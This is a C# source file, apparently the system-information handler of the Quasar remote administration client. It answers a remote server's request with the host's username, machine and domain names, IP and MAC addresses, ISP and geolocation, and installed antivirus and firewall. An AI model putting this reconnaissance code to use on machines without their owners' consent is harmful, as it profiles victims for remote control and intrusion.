using Quasar.Client.Helper;
using Quasar.Client.IpGeoLocation;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;

namespace Quasar.Client.Messages
{
    public class SystemInformationHandler : MessageProcessorBase<object>
    {
        public SystemInformationHandler() : base(false)
        {
        }

        public override bool CanExecute(IMessage message) => message is GetSystemInfo;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetSystemInfo msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetSystemInfo message)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";

                var geoInfo = GeoInformationFactory.GetGeoInformation();

                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                {
                    new Tuple<string, string>("Processor (CPU)", DevicesHelper.GetCpuName()),
                    new Tuple<string, string>("Memory (RAM)", $"{DevicesHelper.GetTotalRamAmount()} MB"),
                    new Tuple<string, string>("Video Card (GPU)", DevicesHelper.GetGpuName()),
                    new Tuple<string, string>("Username", WindowsAccountHelper.GetName()),
                    new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
                    new Tuple<string, string>("Domain Name", domainName),
                    new Tuple<string, string>("Host Name", hostName),
                    new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
                    new Tuple<string, string>("System Directory", Environment.SystemDirectory),
                    new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
                    new Tuple<string, string>("MAC Address", DevicesHelper.GetMacAddress()),
                    new Tuple<string, string>("LAN IP Address", DevicesHelper.GetLanIp()),
                    new Tuple<string, string>("WAN IP Address", geoInfo.IpAddress),
                    new Tuple<string, string>("ASN", geoInfo.Asn),
                    new Tuple<string, string>("ISP", geoInfo.Isp),
                    new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                    new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                    new Tuple<string, string>("Time Zone", geoInfo.Timezone),
                    new Tuple<string, string>("Country", geoInfo.Country)
                };

                client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
            }
            catch
            {
            }
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
